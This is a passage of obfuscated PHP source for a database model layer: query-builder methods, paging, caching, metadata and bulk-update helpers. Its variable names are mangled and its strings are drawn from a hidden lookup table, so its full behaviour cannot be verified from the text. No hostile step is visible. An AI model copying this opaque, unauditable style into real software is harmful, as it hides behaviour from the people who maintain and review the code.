think_exception(think_lang($¬êÛ²¾[358])); } $this->data = $ÖÖÀ±Êó; return $this; } public function join($ç•‹ü§) { $Úœ÷Ğ¥§ =& $_SERVER[øşô´çË]; if (is_array($ç•‹ü§)) { $this->options[$Úœ÷Ğ¥§[369]] = $ç•‹ü§; } elseif (!empty($ç•‹ü§)) { $this->options[$Úœ÷Ğ¥§[369]][] = $ç•‹ü§; } return $this; } public function union($ÒÔüì¬‘, $×„ï¡úÕ = false) { $ÀÍÓêÊ² =& $_SERVER[øşô´çË]; if (empty($ÒÔüì¬‘)) { return $this; } if ($×„ï¡úÕ) { $this->options[$ÀÍÓêÊ²[431]][$ÀÍÓêÊ²[432]] = !0; } if (is_object($ÒÔüì¬‘)) { $ÒÔüì¬‘ = get_object_vars($ÒÔüì¬‘); } if (is_string($ÒÔüì¬‘)) { $ºÇöş“– = $ÒÔüì¬‘; } elseif (is_array($ÒÔüì¬‘)) { if (isset($ÒÔüì¬‘[0])) { $this->options[$ÀÍÓêÊ²[431]] = array_merge($this->options[$ÀÍÓêÊ²[431]], $ÒÔüì¬‘); return $this; } else { $ºÇöş“– = $ÒÔüì¬‘; } } else { think_exception(think_lang($ÀÍÓêÊ²[358])); } $this->options[$ÀÍÓêÊ²[431]][] = $ºÇöş“–; return $this; } public function cache($„Ë²øôå = true, $‚Õ¬èØĞ = null, $”©Ñªı = '') { $³ã»¸Ì =& $_SERVER[øşô´çË]; if (!1 !== $„Ë²øôå) { $this->options[$³ã»¸Ì[433]] = array($³ã»¸Ì[105] => $„Ë²øôå, $³ã»¸Ì[423] => $‚Õ¬èØĞ, $³ã»¸Ì[43] => $”©Ñªı); } return $this; } public function field($Û¨Ö‘¼¯, $ğèãœÚã = false) { $´¨—Î”¡ =& $_SERVER[øşô´çË]; if (!0 === $Û¨Ö‘¼¯) { $ Æ¾ó…Ğ = $this->getDbFields(); $Û¨Ö‘¼¯ = $ Æ¾ó…Ğ ? $ Æ¾ó…Ğ : $´¨—Î”¡[230]; } elseif ($ğèãœÚã) { if (is_string($Û¨Ö‘¼¯)) { $Û¨Ö‘¼¯ = explode($´¨—Î”¡[60], $Û¨Ö‘¼¯); } $ Æ¾ó…Ğ = $this->getDbFields(); $Û¨Ö‘¼¯ = $ Æ¾ó…Ğ ? array_diff($ Æ¾ó…Ğ, $Û¨Ö‘¼¯) : $Û¨Ö‘¼¯; } $this->options[$´¨—Î”¡[360]] = $Û¨Ö‘¼¯; return $this; } public function scope($¼¦ŠÚ¿ = '', $øçÖ™ğ = NULL) { $í ÷‡§ï =& $_SERVER[øşô´çË]; if ($í ÷‡§ï[12] === $¼¦ŠÚ¿) { if (isset($this->_scope[$í ÷‡§ï[47]])) { $ˆŠÔ¯ = $this->_scope[$í ÷‡§ï[47]]; } else { return $this; } } elseif (is_string($¼¦ŠÚ¿)) { $¼ÌöªÔĞ = explode($í ÷‡§ï[60], $¼¦ŠÚ¿); $ˆŠÔ¯ = array(); foreach ($¼ÌöªÔĞ as $µÃ‹‰„«) { if (!isset($this->_scope[$µÃ‹‰„«])) { continue; } $ˆŠÔ¯ = array_merge($ˆŠÔ¯, $this->_scope[$µÃ‹‰„«]); } if (!empty($øçÖ™ğ) && is_array($øçÖ™ğ)) { $ˆŠÔ¯ = array_merge($ˆŠÔ¯, $øçÖ™ğ); } } elseif (is_array($¼¦ŠÚ¿)) { $ˆŠÔ¯ = $¼¦ŠÚ¿; } if (is_array($ˆŠÔ¯) && !empty($ˆŠÔ¯)) { $this->options = array_merge($this->options, array_change_key_case($ˆŠÔ¯)); } return $this; } public function where($âğò®üù, $¥ß„ıµ½ = null) { $¾ÃÁüõ =& $_SERVER[øşô´çË]; if (!is_null($¥ß„ıµ½) && is_string($âğò®üù)) { if (!is_array($¥ß„ıµ½)) { $¥ß„ıµ½ = func_get_args(); array_shift($¥ß„ıµ½); } $¥ß„ıµ½ = array_map(array($this->db, $¾ÃÁüõ[427]), $¥ß„ıµ½); $âğò®üù = vsprintf($âğò®üù, $¥ß„ıµ½); } elseif (is_object($âğò®üù)) { $âğò®üù = get_object_vars($âğò®üù); } elseif (is_array($âğò®üù)) { foreach ($âğò®üù as $İñ„ß–ª => $¶¡°Òâ) { if ((is_numeric($İñ„ß–ª) || !$İñ„ß–ª) && is_string($¶¡°Òâ)) { if (strpos($¶¡°Òâ, $¾ÃÁüõ[434]) === 0) { continue; } think_trace($¾ÃÁüõ[435], $¾ÃÁüõ[12], $¾ÃÁüõ[59]); die; } } } if (is_string($âğò®üù) && $¾ÃÁüõ[12] != $âğò®üù) { $àËÔš¦Š = array(); $àËÔš¦Š[$¾ÃÁüõ[436]] = $âğò®üù; $âğò®üù = $àËÔš¦Š; } if (isset($this->options[$¾ÃÁüõ[362]])) { $this->options[$¾ÃÁüõ[362]] = array_merge($this->options[$¾ÃÁüõ[362]], $âğò®üù); } else { $this->options[$¾ÃÁüõ[362]] = $âğò®üù; } return $this; } public function limit($Ï¢Óë‹ , $òîÏ´­ = null) { $Äµûì•ö =& $_SERVER[øşô´çË]; $this->options[$Äµûì•ö[377]] = is_null($òîÏ´­) ? $Ï¢Óë‹  : $Ï¢Óë‹  . $Äµûì•ö[60] . $òîÏ´­; return $this; } public function page($Á“¹‘Ş«, $ŸÇñ´ûÍ = null) { $¶ù”½ğ =& $_SERVER[øşô´çË]; $this->options[$¶ù”½ğ[437]] = is_null($ŸÇñ´ûÍ) ? $Á“¹‘Ş« : $Á“¹‘Ş« . $¶ù”½ğ[60] . $ŸÇñ´ûÍ; return $this; } public function comment($‡ø¾ƒÏû) { $this->options[$_SERVER[øşô´çË][438]] = $‡ø¾ƒÏû; return $this; } public function setProperty($·âÇ©»Í, $ç¥­â–¿) { if (property_exists($this, $·âÇ©»Í)) { $this->{$·âÇ©»Í} = $ç¥­â–¿; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\x54\151\x6d\x65", "\x74\x69\155\145", "\151\156\163\x65\x72\164\x2c\x75\160\x64\x61\164\x65", "\x66\x75\156\143\x74\151\x6f\x6e"), array("\143\x72\x65\x61\164\x65\x54\x69\155\x65", "\x74\x69\155\x65", "\x69\x6e\x73\145\x72\x74", "\146\x75\156\x63\x74\151\157\156")); public function setDataAuto($õáÏ‚ğ“) { $this->dataAuto = $õáÏ‚ğ“; } public function __construct($ÎÙ¹’Œ = '', $¾ÎŸ×ò = '', $›É¢£·İ = '') { parent::__construct($ÎÙ¹’Œ, $¾ÎŸ×ò, $›É¢£·İ); } protected $tableMeta = array(); protected function _beforeInsert(&$À§Íğ€, $ä÷àÉõ‹) { $ôßï‡÷€ =& $_SERVER[øşô´çË]; if (!$this->checkDataAutoHas($ôßï‡÷€[439])) { return; } $this->dataBeforeFilter($À§Íğ€, $ôßï‡÷€[439]); } protected function _beforeUpdate(&$ïÔ·ş Ì, $±«°®ıÕ) { $„¾É˜Š =& $_SERVER[øşô´çË]; if (!$this->checkDataAutoHas($„¾É˜Š[440])) { return; } $this->dataBeforeFilter($ïÔ·ş Ì, $„¾É˜Š[440]); } protected function _afterSelect(&$Ä¯¤“ÆÈ, $‹†Ûáëö) { if (!is_array($Ä¯¤“ÆÈ)) { return; } if (!$this->checkDataAutoHas($_SERVER[øşô´çË][441])) { return; } foreach ($Ä¯¤“ÆÈ as &$„¹İÓ•Î) { $this->dataAfterFilter($„¹İÓ•Î); } unset($„¹İÓ•Î); } protected function _afterFind(&$Ëğè—ÙÌ, $ËÂ·—ªõ) { if (!is_array($Ëğè—ÙÌ)) { return; } if (!$this->checkDataAutoHas($_SERVER[øşô´çË][441])) { return; } $this->dataAfterFilter($Ëğè—ÙÌ); } public static function textEncode($†ÒæÖ‘Ú) { if (!$†ÒæÖ‘Ú) { return $†ÒæÖ‘Ú; } $Ì½åı¼— = json_encode($†ÒæÖ‘Ú); $Ì½åı¼— = preg_replace_callback($_SERVER[øşô´çË][442], function ($¬úµ¹´ø) { return addslashes($¬úµ¹´ø[0]); }, $Ì½åı¼—); return json_decode($Ì½åı¼—); } public static function textDecode($ÎÑÅš²) { $‚»—äîÈ =& $_SERVER[øşô´çË]; if (!$ÎÑÅš²) { return $ÎÑÅš²; } $–‡¡ËÒ• = json_encode($ÎÑÅš²); $–‡¡ËÒ• = preg_replace_callback($‚»—äîÈ[443], function ($ëÓÒƒœõ) { return $_SERVER[øşô´çË][107]; }, $–‡¡ËÒ•); return json_decode($–‡¡ËÒ•); } public function setAutoIncrement($íˆÉÂ¥Ï) { $ÙİØÉıœ = array($this->getPk() => $íˆÉÂ¥Ï); $ø©Š¼‚ = $this->data($ÙİØÉıœ)->add(); if ($ø©Š¼‚) { $this->delete($ø©Š¼‚); } } public function getAutoIncrement() { $Š’‡…”½ = $this->getTableName(); $ûË™Ë» = $this->max($this->getPk()); $é§¨‹ÔË = $this->query("\x73\150\x6f\x77\x20\x74\141\142\154\x65\40\x73\x74\141\164\165\163\40\167\150\145\162\x65\x20\x4e\141\x6d\x65\x3d\47{$Š’‡…”½}\x27"); $·£Ÿ¦Î = $é§¨‹ÔË[0][$_SERVER[øşô´çË][444]]; $ùïØæ = max($ûË™Ë», $·£Ÿ¦Î); return $ùïØæ; } protected function _callBefore($¼ñ»¬¥é, $­š²€†ê) { return $this->cacheCallCheck($¼ñ»¬¥é, $­š²€†ê, !1); } protected function _callAfter($¼…¨«›®, $ÚÑŸå„›) { return $this->cacheCallCheck($¼…¨«›®, $ÚÑŸå„›, !0); } protected function cacheFunctionAlias($ÔéÓŸé) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($µ¹úÈ•, $Ùœäåü“, $âŸÊ…ßé = false) { $°•Ÿ´Š =& $_SERVER[øşô´çË]; $€ãÚ÷¡õ = $this->cacheFunctionAlias($Ùœäåü“); if (!$€ãÚ÷¡õ) { return; } foreach ($€ãÚ÷¡õ as $¡¥âí† => $ğ”İ„É) { $àá¦íñ“ = $ğ”İ„É[0]; $Ô¼¼äËè = explode($°•Ÿ´Š[60], $ğ”İ„É[1]); $û¨øç¿’ = isset($ğ”İ„É[2]) ? $ğ”İ„É[2] : $°•Ÿ´Š[12]; if ($µ¹úÈ• == $¡¥âí†) { return $this->cacheFunctionGet($¡¥âí†, $àá¦íñ“, $û¨øç¿’); } if ($âŸÊ…ßé && in_array($µ¹úÈ•, $Ô¼¼äËè)) { $this->cacheFunctionClear($¡¥âí†, $àá¦íñ“, $û¨øç¿’); } } } public function cacheFunctionGet($Îˆï™¿Å, $ó‚‚¡°ü, $ÆÍíı‘Æ = '') { $ÎË”·È =& $_SERVER[øşô´çË]; $¾­·äô» = $this->cacheKeyMake($Îˆï™¿Å, $ó‚‚¡°ü, $ÆÍíı‘Æ); $œåà½é = Cache::get($¾­·äô»); if (!is_array($œåà½é)) { if (method_exists($this, $ÎË”·È[350] . $Îˆï™¿Å)) { $Îˆï™¿Å = $ÎË”·È[350] . $Îˆï™¿Å; } $œåà½é = call_user_func_array(array($this, $Îˆï™¿Å), array($ó‚‚¡°ü, !0)); Cache::set($¾­·äô», $œåà½é); } return $œåà½é; } public function cacheFunctionClear($ß–é¼ à, $ÃÜ‚ Áí, $şÕıŞíß = '') { $íÑÍÂ¼ı = $ÃÜ‚ Áí; if (!is_array($ÃÜ‚ Áí)) { $íÑÍÂ¼ı = array($ÃÜ‚ Áí); } foreach ($íÑÍÂ¼ı as $Ô‡ø£¸â) { $×ÆÜšÖİ = $this->cacheKeyMake($ß–é¼ à, $Ô‡ø£¸â, $şÕıŞíß); Cache::remove($×ÆÜšÖİ); } } public function cacheKeyMake($Œ‹ÔŞ¢ã, $ÌöãĞæ©, $õšçÇ…) { $ÓÅ‹õÀÛ =& $_SERVER[øşô´çË]; if ($õšçÇ…) { $ÌöãĞæ© = $ÌöãĞæ© . $ÓÅ‹õÀÛ[445] . $õšçÇ…; } return get_class($this) . $ÓÅ‹õÀÛ[11] . $Œ‹ÔŞ¢ã . $ÓÅ‹õÀÛ[446] . $ÌöãĞæ©; } protected function selectPageReset() { $§œæÌ·§ =& $_SERVER[øşô´çË]; if (isset($GLOBALS[$§œæÌ·§[447]])) { return; } $GLOBALS[$§œæÌ·§[447]] = isset($GLOBALS[$§œæÌ·§[7]][$§œæÌ·§[448]]) ? $GLOBALS[$§œæÌ·§[7]][$§œæÌ·§[448]] : !1; $GLOBALS[$§œæÌ·§[449]] = isset($GLOBALS[$§œæÌ·§[7]][$§œæÌ·§[437]]) ? $GLOBALS[$§œæÌ·§[7]][$§œæÌ·§[437]] : !1; $GLOBALS[$§œæÌ·§[7]][$§œæÌ·§[448]] = !1; $GLOBALS[$§œæÌ·§[7]][$§œæÌ·§[437]] = !1; } protected function selectPageRestore() { $½øÖÊ›¥ =& $_SERVER[øşô´çË]; if (!isset($GLOBALS[$½øÖÊ›¥[447]])) { return; } $GLOBALS[$½øÖÊ›¥[7]][$½øÖÊ›¥[448]] = $GLOBALS[$½øÖÊ›¥[447]]; $GLOBALS[$½øÖÊ›¥[7]][$½øÖÊ›¥[437]] = $GLOBALS[$½øÖÊ›¥[449]]; if ($GLOBALS[$½øÖÊ›¥[7]][$½øÖÊ›¥[448]] === !1) { unset($GLOBALS[$½øÖÊ›¥[7]][$½øÖÊ›¥[448]]); } if ($GLOBALS[$½øÖÊ›¥[7]][$½øÖÊ›¥[437]] === !1) { unset($GLOBALS[$½øÖÊ›¥[7]][$½øÖÊ›¥[437]]); } unset($GLOBALS[$½øÖÊ›¥[447]]); unset($GLOBALS[$½øÖÊ›¥[449]]); } protected function selectPage($¦³û»øÖ = 200, $ŞÕ†ıÕ½ = 1) { $©’›ÕşÔ =& $_SERVER[øşô´çË]; global $in; $´×ĞÑ’› = $this->optionsValue(); $Ã÷§ÁÍâ = 100000; $¦³û»øÖ = isset($in[$©’›ÕşÔ[448]]) && $in[$©’›ÕşÔ[448]] ? $in[$©’›ÕşÔ[448]] : $¦³û»øÖ; if ($¦³û»øÖ === -1) { $in[$©’›ÕşÔ[448]] = !1; $Ã÷§ÁÍâ = 100000000; $¦³û»øÖ = $Ã÷§ÁÍâ; } $É¾”âÁ‰ = $´×ĞÑ’›; $É¾”âÁ‰[$©’›ÕşÔ[450]] = array(); $¦³û»øÖ = intval($¦³û»øÖ); $¦³û»øÖ = $¦³û»øÖ <= 5 ? 5 : ($¦³û»øÖ >= $Ã÷§ÁÍâ ? $Ã÷§ÁÍâ : $¦³û»øÖ); $ŞÕ†ıÕ½ = intval(isset($in[$©’›ÕşÔ[437]]) && $in[$©’›ÕşÔ[437]] ? $in[$©’›ÕşÔ[437]] : $ŞÕ†ıÕ½); $ŞÕ†ıÕ½ = $ŞÕ†ıÕ½ <= 1 ? 1 : $ŞÕ†ıÕ½; $ó·ñ¬¬é = array(); $œõ¸¾×ó = 1; $¿²Àëà = $this->selectPageCountBy(); if ($ŞÕ†ıÕ½ == 1 && $œõ¸¾×ó) { $this->optionsValue($´×ĞÑ’›); $ó·ñ¬¬é = $this->page($ŞÕ†ıÕ½, $¦³û»øÖ)->select(); $Ú¦ø¡†º = is_array($ó·ñ¬¬é) ? count($ó·ñ¬¬é) : 0; if ($Ú¦ø¡†º < $¦³û»øÖ) { $¬ÕïëÅ = 1; } else { $this->optionsValue($É¾”âÁ‰); $Ú¦ø¡†º = intval($this->count($¿²Àëà)); $¬ÕïëÅ = ceil($Ú¦ø¡†º / $¦³û»øÖ); } } else { $this->optionsValue($É¾”âÁ‰); $Ú¦ø¡†º = intval($this->count($¿²Àëà)); $¬ÕïëÅ = ceil($Ú¦ø¡†º / $¦³û»øÖ); $ŞÕ†ıÕ½ = $ŞÕ†ıÕ½ >= $¬ÕïëÅ ? $¬ÕïëÅ : $ŞÕ†ıÕ½; $this->optionsValue($´×ĞÑ’›); $ó·ñ¬¬é = $this->page($ŞÕ†ıÕ½, $¦³û»øÖ)->select(); } $this->selectPageCountBy($©’›ÕşÔ[451]); if (!is_array($ó·ñ¬¬é)) { $ó·ñ¬¬é = array(); } if ($¬ÕïëÅ == 1) { $Ú¦ø¡†º = count($ó·ñ¬¬é); } $‘š«Ó¯ = array($©’›ÕşÔ[452] => array($©’›ÕşÔ[453] => $Ú¦ø¡†º, $©’›ÕşÔ[448] => $¦³û»øÖ, $©’›ÕşÔ[437] => $ŞÕ†ıÕ½, $©’›ÕşÔ[454] => $¬ÕïëÅ), $©’›ÕşÔ[455] => $ó·ñ¬¬é); return $‘š«Ó¯; } protected function selectPageCountBy($ºÑƒÃÑí = false) { static $ïÃí§óæ = null; if (!$ºÑƒÃÑí) { return $ïÃí§óæ; } if ($ºÑƒÃÑí == $_SERVER[øşô´çË][451]) { $ïÃí§óæ = null; return; } $ïÃí§óæ = $ºÑƒÃÑí; } protected function checkLength($ÙáÃŠîˆ, $Ÿ—ãúİÇ = 0, $åŸµ§ä© = '') { $°ş€­Õ¾ =& $_SERVER[øşô´çË]; $Ÿ—ãúİÇ = $Ÿ—ãúİÇ ? $Ÿ—ãúİÇ : 65536; if (!$ÙáÃŠîˆ || strlen($ÙáÃŠîˆ) < $Ÿ—ãúİÇ) { return; } $åŸµ§ä© = $åŸµ§ä© ? $åŸµ§ä© . $°ş€­Õ¾[84] : $°ş€­Õ¾[12]; show_json($åŸµ§ä© . LNG($°ş€­Õ¾[456]) . "\x28{$Ÿ—ãúİÇ}\x29", !1); } protected function metaSet($Æºß¦Ü¾, $¾É¿åÕø = null, $¥¼­¯–¡ = null) { $Ÿ«ÍèØË =& $_SERVER[øşô´çË]; if (!$this->tableMeta || !$Æºß¦Ü¾) { return !1; } $¥¹”ß¤š = $this->tableMeta[$Ÿ«ÍèØË[457]]; $Ùá´º«­ = $this->tableMeta[$Ÿ«ÍèØË[458]]; $ÑĞ ¾®â = Model($Ùá´º«­); $²Àıò = array($¥¹”ß¤š => $Æºß¦Ü¾, $Ÿ«ÍèØË[459] => $¾É¿åÕø); if (is_null($¾É¿åÕø)) { return $ÑĞ ¾®â->where(array($¥¹”ß¤š => $Æºß¦Ü¾))->delete(); } if (is_null($¥¼­¯–¡) && is_string($¾É¿åÕø)) { return $ÑĞ ¾®â->where($²Àıò)->delete(); } $½ÍóÓä = is_array($¾É¿åÕø) ? $¾É¿åÕø : array(); if (is_string($¾É¿åÕø)) { $½ÍóÓä[$¾É¿åÕø] = $¥¼­¯–¡; } $Èäæµë = array(); foreach ($½ÍóÓä as $ô©û³®Œ => $¤›¸á ) { if (is_null($¤›¸á ) && is_string($ô©û³®Œ)) { $ÑĞ ¾®â->where(array($¥¹”ß¤š => $Æºß¦Ü¾, $Ÿ«ÍèØË[459] => $ô©û³®Œ))->delete(); continue; } $this->checkLength($¤›¸á , !1, $Ùá´º«­ . $Ÿ«ÍèØË[4] . $ô©û³®Œ); $Èäæµë[] = array($¥¹”ß¤š => $Æºß¦Ü¾, $Ÿ«ÍèØË[105] => $ô©û³®Œ, $Ÿ«ÍèØË[460] => $¤›¸á ); } $ñàŞÄ¸– = $Ÿ«ÍèØË[461] . $Ùá´º«­; CacheLock::lock($ñàŞÄ¸–); $ÑĞ ¾®â->where(array($¥¹”ß¤š => $Æºß¦Ü¾))->addAll($Èäæµë, array(), !0); CacheLock::unlock($ñàŞÄ¸–); return !0; } public function metaGet($ÎÊ½‘£, $Ëûı‡ÈŸ = false) { $üçÚ«Á =& $_SERVER[øşô´çË]; if (!$this->tableMeta) { return array(); } $ÑëĞşŠ = $this->tableMeta[$üçÚ«Á[457]]; $ùÖ‰¹› = Model($this->tableMeta[$üçÚ«Á[458]]); if ($Ëûı‡ÈŸ) { $…¿¤Ñ¶ç = array($ÑëĞşŠ => $ÎÊ½‘£, $üçÚ«Á[105] => $Ëûı‡ÈŸ); return $ùÖ‰¹›->where($…¿¤Ñ¶ç)->getField($üçÚ«Á[460]); } $…¿¤Ñ¶ç = array($ÑëĞşŠ => $ÎÊ½‘£); $ã‚×¿½Ï = $ùÖ‰¹›->field($üçÚ«Á[462])->where($…¿¤Ñ¶ç)->select(); $ã‚×¿½Ï = array_to_keyvalue($ã‚×¿½Ï, $üçÚ«Á[105], $üçÚ«Á[460]); return $ã‚×¿½Ï; } private function checkDataAutoHas($©ú¹å³Â) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÎñÆÊ) { if (in_array($©ú¹å³Â, explode($_SERVER[øşô´çË][60], $ÎñÆÊ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$›šÒ†ı½, $ï«†¿–Œ) { $Ï¸½ËÙ =& $_SERVER[øşô´çË]; if (!is_array($›šÒ†ı½)) { return; } foreach ($this->dataAuto as $†›“ÁÍë) { $şÕ°ÃÏ© = $†›“ÁÍë[0]; if (!in_array($ï«†¿–Œ, explode($Ï¸½ËÙ[60], $†›“ÁÍë[2]))) { continue; } switch (trim($†›“ÁÍë[3])) { case $Ï¸½ËÙ[405]: case $Ï¸½ËÙ[406]: $óğ±¬îÃ = $†›“ÁÍë[1]; $•²«øäú = isset($†›“ÁÍë[4]) ? (array) $†›“ÁÍë[4] : array(); if ($óğ±¬îÃ == $Ï¸½ËÙ[214] && array_key_exists($şÕ°ÃÏ©, $›šÒ†ı½)) { if (!$›šÒ†ı½[$şÕ°ÃÏ©]) { unset($›šÒ†ı½[$şÕ°ÃÏ©]); } break; } if (isset($›šÒ†ı½[$şÕ°ÃÏ©])) { array_unshift($•²«øäú, $›šÒ†ı½[$şÕ°ÃÏ©]); } if ($Ï¸½ËÙ[405] == $†›“ÁÍë[3]) { $›šÒ†ı½[$şÕ°ÃÏ©] = call_user_func_array($óğ±¬îÃ, $•²«øäú); } else { $›šÒ†ı½[$şÕ°ÃÏ©] = call_user_func_array(array(&$this, $óğ±¬îÃ), $•²«øäú); } break; case $Ï¸½ËÙ[357]: if (isset($›šÒ†ı½[$şÕ°ÃÏ©]) && $›šÒ†ı½[$şÕ°ÃÏ©]) { $›šÒ†ı½[$şÕ°ÃÏ©] = call_user_func_array(array(&$this, $†›“ÁÍë[1]), array($›šÒ†ı½[$şÕ°ÃÏ©])); } break; case $Ï¸½ËÙ[360]: $›šÒ†ı½[$şÕ°ÃÏ©] = $›šÒ†ı½[$†›“ÁÍë[1]]; break; case $Ï¸½ËÙ[378]: if (isset($›šÒ†ı½[$şÕ°ÃÏ©]) && !is_string($›šÒ†ı½[$şÕ°ÃÏ©])) { $›šÒ†ı½[$şÕ°ÃÏ©] = json_encode_force($›šÒ†ı½[$şÕ°ÃÏ©]); $›šÒ†ı½[$şÕ°ÃÏ©] = self::textEncode($›šÒ†ı½[$şÕ°ÃÏ©]); } break; case $Ï¸½ËÙ[407]: if ($›šÒ†ı½[$şÕ°ÃÏ©] === $Ï¸½ËÙ[12]) { unset($›šÒ†ı½[$şÕ°ÃÏ©]); } break; case $Ï¸½ËÙ[408]: $›šÒ†ı½[$şÕ°ÃÏ©] = $†›“ÁÍë[1]; default: break; } } if ($ï«†¿–Œ == $Ï¸½ËÙ[439]) { $éïƒÅ© = strtolower($this->db->getDbType()); if (strpos($éïƒÅ©, $Ï¸½ËÙ[23]) !== 0) { return; } $‚íÜ®¦Æ = $this->field(!0)->fields; $¶ ©²½ = $‚íÜ®¦Æ[$Ï¸½ËÙ[338]]; if (isset($‚íÜ®¦Æ[$Ï¸½ËÙ[337]])) { unset($¶ ©²½[$‚íÜ®¦Æ[$Ï¸½ËÙ[337]]]); } foreach ($¶ ©²½ as $×óŠÒõ™ => $ï«†¿–Œ) { if (!isset($›šÒ†ı½[$×óŠÒõ™])) { $›šÒ†ı½[$×óŠÒõ™] = $Ï¸½ËÙ[12]; } } } } private function dataAfterFilter(&$ÊÉ½¶ê‹) { $šó‘Â¡ =& $_SERVER[øşô´çË]; foreach ($this->dataAuto as $ŞúÇø‘¾) { $³ÂÔñ½— = $ŞúÇø‘¾[0]; if (!isset($ÊÉ½¶ê‹[$³ÂÔñ½—])) { continue; } if (!in_array($šó‘Â¡[441], explode($šó‘Â¡[60], $ŞúÇø‘¾[2]))) { continue; } switch (trim($ŞúÇø‘¾[3])) { case $šó‘Â¡[405]: case $šó‘Â¡[406]: $ıè¡î¶¿ = isset($ŞúÇø‘¾[4]) ? (array) $ŞúÇø‘¾[4] : array(); array_unshift($ıè¡î¶¿, $ÊÉ½¶ê‹[$³ÂÔñ½—]); if (isset($ŞúÇø‘¾[4]) && $ŞúÇø‘¾[4] == $šó‘Â¡[463]) { $ıè¡î¶¿ = array($ÊÉ½¶ê‹[$³ÂÔñ½—]); } if ($šó‘Â¡[405] == $ŞúÇø‘¾[3]) { $ÊÉ½¶ê‹[$³ÂÔñ½—] = call_user_func_array($ŞúÇø‘¾[1], $ıè¡î¶¿); } else { $ÊÉ½¶ê‹[$³ÂÔñ½—] = call_user_func_array(array(&$this, $ŞúÇø‘¾[1]), $ıè¡î¶¿); } break; case $šó‘Â¡[357]: if (isset($ÊÉ½¶ê‹[$³ÂÔñ½—]) && $ÊÉ½¶ê‹[$³ÂÔñ½—]) { $ÊÉ½¶ê‹[$³ÂÔñ½—] = call_user_func_array(array(&$this, $ŞúÇø‘¾[1]), array($ÊÉ½¶ê‹[$³ÂÔñ½—])); } break; case $šó‘Â¡[360]: $ÊÉ½¶ê‹[$³ÂÔñ½—] = $ÊÉ½¶ê‹[$ŞúÇø‘¾[1]]; break; case $šó‘Â¡[378]: $î¨‘šÚÌ = $ÊÉ½¶ê‹[$³ÂÔñ½—]; $î¨‘šÚÌ = self::textDecode($î¨‘šÚÌ); $ÊÉ½¶ê‹[$³ÂÔñ½—] = json_decode($î¨‘šÚÌ, !0); if (is_null($ÊÉ½¶ê‹[$³ÂÔñ½—])) { $ÊÉ½¶ê‹[$³ÂÔñ½—] = $î¨‘šÚÌ; } break; case $šó‘Â¡[407]: if ($ÊÉ½¶ê‹[$³ÂÔñ½—] === $šó‘Â¡[12]) { unset($ÊÉ½¶ê‹[$³ÂÔñ½—]); } break; case $šó‘Â¡[408]: $ÊÉ½¶ê‹[$³ÂÔñ½—] = $ŞúÇø‘¾[1]; break; default: break; } } } public function saveAll($”Æ÷›–±, $‚œõñ«Ê = false) { $˜‹×Ÿ• =& $_SERVER[øşô´çË]; $€¼”®›ñ = $this->db; $Õ‹‡ˆƒæ = $this->tablePrefix . $this->tableName; $Êá„°å³ = $this->saveAllChunkMake($”Æ÷›–±); $‚œõñ«Ê = is_array($‚œõñ«Ê) ? $‚œõñ«Ê : array(); foreach ($Êá„°å³ as $îÕ­ã¡ù) { $Òßí¡ÎÀ = $˜‹×Ÿ•[12]; $˜æ…©ã = $˜‹×Ÿ•[12]; $îŒØãàˆ = array(); $¸ÓşÕØ = array(); foreach ($îÕ­ã¡ù as $…ŞÙäÛ => $áñå‹£ã) { $Òßí¡ÎÀ = $áñå‹£ã[$˜‹×Ÿ•[464]]; $¸ÓşÕØ[] = $áñå‹£ã[$˜‹×Ÿ•[465]]; $«³“ıÁè = $€¼”®›ñ->parseValue($áñå‹£ã[$˜‹×Ÿ•[465]]); foreach ($áñå‹£ã[$˜‹×Ÿ•[466]] as $ƒºÆÖ·å => $›ÕŒß…Ì) { if (!$îŒØãàˆ[$ƒºÆÖ·å]) { $îŒØãàˆ[$ƒºÆÖ·å] = array(); } $îŒØãàˆ[$ƒºÆÖ·å][] = $˜‹×Ÿ•[467] . $«³“ıÁè . $˜‹×Ÿ•[468] . $€¼”®›ñ->parseValue($›ÕŒß…Ì); } } $âÉÊ¯Ÿ = $Òßí¡ÎÀ; $âÉÊ¯Ÿ = $€¼”®›ñ->parseKey($âÉÊ¯Ÿ); foreach ($îŒØãàˆ as $ƒºÆÖ·å => $Ùî«©ú) { $˜æ…©ã .= $˜‹×Ÿ•[19] . $€¼”®›ñ->parseKey($ƒºÆÖ·å) . $˜‹×Ÿ•[469] . $âÉÊ¯Ÿ . $˜‹×Ÿ•[470]; $˜æ…©ã .= implode($˜‹×Ÿ•[19], $Ùî«©ú) . $˜‹×Ÿ•[471]; } $Ğ‹Û÷µâ = $‚œõñ«Ê; $Ğ‹Û÷µâ[$Òßí¡ÎÀ] = array($˜‹×Ÿ•[7], $¸ÓşÕØ); $°¯Š­¥Ò = "\125\120\104\101\x54\105\40\140{$Õ‹‡ˆƒæ}\x60\x20\123\105\x54\x20" . rtrim($˜æ…©ã, $˜‹×Ÿ•[60]) . $˜‹×Ÿ•[19] . $€¼”®›ñ->parseWhere($Ğ‹Û÷µâ); $this->execute($°¯Š­¥Ò); $this->chunkEventCheck(count($îÕ­ã¡ù)); } $this->chunkEventSet(); } public function saveAllEach($•½·÷öÉ, $ÄèĞ÷© = false) { $´ü²ÉÈæ =& $_SERVER[øşô´çË]; $´ö¢É¬„ = $this->db; $Üàõ«¬ = $this->tablePrefix . $this->tableName; $Úöê­è = $this->saveAllChunkMake($•½·÷öÉ); $ÄèĞ÷© = is_array($ÄèĞ÷©) ? $ÄèĞ÷© : array(); foreach ($Úöê­è as $•Ä‹ï˜) { foreach ($•Ä‹ï˜ as $ßˆ¡¿®¶ => $íÂ–Ÿª) { $†¹×•ùˆ = $´ü²ÉÈæ[472]; foreach ($íÂ–Ÿª[$´ü²ÉÈæ[466]] as $ª˜ö×Æ‰ => $Üä¾²½ş) { $†¹×•ùˆ .= $´ö¢É¬„->parseKey($ª˜ö×Æ‰) . $´ü²ÉÈæ[473] . $´ö¢É¬„->parseValue($Üä¾²½ş) . $´ü²ÉÈæ[60]; } $Éõ¬ùü¿ = $ÄèĞ÷©; $Éõ¬ùü¿[$íÂ–Ÿª[$´ü²ÉÈæ[464]]] = $íÂ–Ÿª[$´ü²ÉÈæ[465]]; $®ó°£ = "\x55\120\x44\x41\124\105\40\140{$Üàõ«¬}\140\x20\123\105\124\40" . 